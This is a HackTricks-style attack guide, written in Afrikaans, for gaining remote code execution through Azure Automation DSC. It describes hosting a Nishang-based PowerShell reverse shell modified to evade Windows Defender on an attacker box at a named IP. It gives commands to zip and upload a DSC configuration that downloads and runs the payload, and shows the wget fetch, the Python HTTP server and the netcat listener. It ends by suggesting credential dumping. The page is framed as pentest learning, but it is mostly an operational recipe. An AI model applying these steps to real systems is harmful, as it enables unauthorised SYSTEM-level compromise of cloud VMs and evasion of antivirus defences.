# Az - State Configuration RCE

{{#include ../../../../banners/hacktricks-training.md}}

**Kontroleer die volledige pos in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Samevatting van Afgeleë Bediener (C2) Infrastruktuur Voorbereiding en Stappe

#### Oorsig

Die proses behels die opstelling van 'n afgeleë bediener infrastruktuur om 'n gemodifiseerde Nishang `Invoke-PowerShellTcp.ps1` payload, genaamd `RevPS.ps1`, te huisves, wat ontwerp is om Windows Defender te omseil. Die payload word bedien vanaf 'n Kali Linux masjien met IP `40.84.7.74` met behulp van 'n eenvoudige Python HTTP bediener. Die operasie word deur verskeie stappe uitgevoer:

#### Stap 1 — Skep Lêers

- **Benodigde Lêers:** Twee PowerShell skripte is nodig:
1. `reverse_shell_config.ps1`: 'n Gewenste Toestand Konfigurasie (DSC) lêer wat die payload aflaai en uitvoer. Dit is beskikbaar op [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: 'n Skrip om die konfigurasie na die VM te publiseer, beskikbaar op [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).
- **Aanpassing:** Veranderlikes en parameters in hierdie lêers moet aangepas word vir die gebruiker se spesifieke omgewing, insluitend hulpbronname, lêerpaaie, en bediener/payload identifiseerders.

#### Stap 2 — Zip Konfigurasie Lêer

- Die `reverse_shell_config.ps1` word gecomprimeer in 'n `.zip` lêer, wat dit gereed maak vir oordrag na die Azure Storage Account.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Stap 3 — Stel Bergingskonteks in & Laai op

- Die gecomprimeerde konfigurasie-lêer word na 'n voorafbepaalde Azure Storage-container, azure-pentest, opgelaai met behulp van Azure se Set-AzStorageBlobContent cmdlet.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Stap 4 — Berei Kali Box Voor

- Die Kali-bediener laai die RevPS.ps1 payload af van 'n GitHub-bewaarplek.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Die skrip is gewysig om die teiken Windows VM en poort vir die omgekeerde skulp te spesifiseer.

#### Stap 5 — Publiseer Konfigurasie Lêer

- Die konfigurasie lêer word uitgevoer, wat daartoe lei dat die omgekeerde-skulpskrip na die gespesifiseerde ligging op die Windows VM ontplooi word.

#### Stap 6 — Gasheer Payload en Stel Luisteraar Op

- 'n Python SimpleHTTPServer word begin om die payload te gasheer, saam met 'n Netcat luisteraar om inkomende verbindings te vang.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- Die geskeduleerde taak voer die payload uit, wat SYSTEM-vlak bevoegdhede bereik.

#### Gevolgtrekking

Die suksesvolle uitvoering van hierdie proses open talle moontlikhede vir verdere aksies, soos geloofsbrief dumping of die uitbreiding van die aanval na verskeie VM's. Die gids moedig voortgesette leer en kreatiwiteit in die gebied van Azure Automation DSC aan.

{{#include ../../../../banners/hacktricks-training.md}}
